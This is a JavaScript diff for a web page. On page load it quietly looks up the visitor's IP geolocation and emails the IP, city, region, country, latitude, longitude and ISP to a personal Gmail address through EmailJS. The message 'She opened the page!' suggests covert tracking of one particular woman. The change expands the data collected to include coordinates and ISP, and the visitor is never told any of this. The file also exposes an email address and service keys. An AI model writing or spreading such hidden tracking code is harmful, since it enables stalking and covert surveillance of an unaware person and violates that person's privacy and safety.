@@ -175,18 +175,21 @@ function animateModel() {
 }
 
 document.addEventListener("DOMContentLoaded", function () {
-    emailjs.init("g68cD0jfv_Qzhryze"); // Your Public Key
+    emailjs.init("g68cD0jfv_Qzhryze"); // Replace with your actual public key
 
-    fetch("https://api.db-ip.com/v2/free/self")
+    fetch("http://ip-api.com/json/") // Free API for IP location
         .then(response => response.json())
         .then(data => {
-            console.log(data); // Check the full response in console
+            let lat = data.lat;
+            let lon = data.lon;
 
             let templateParams = {
                 to_email: "techpc.u2005@gmail.com", // Your Email
                 message: `She opened the page! 
-                          IP: ${data.ipAddress} 
-                          City: ${data.city}, Region: ${data.stateProv}, Country: ${data.countryName}`
+                          IP: ${data.query} 
+                          City: ${data.city}, Region: ${data.regionName}, Country: ${data.country} 
+                          Latitude: ${lat}, Longitude: ${lon}
+                          ISP: ${data.isp}`
             };
 
             emailjs.send("service_sklywbd", "template_qy6e6za", templateParams)
@@ -198,6 +201,7 @@ document.addEventListener("DOMContentLoaded", function () {
         })
         .catch(error => console.log("Failed to get IP info", error));
 });
+
 
 
 
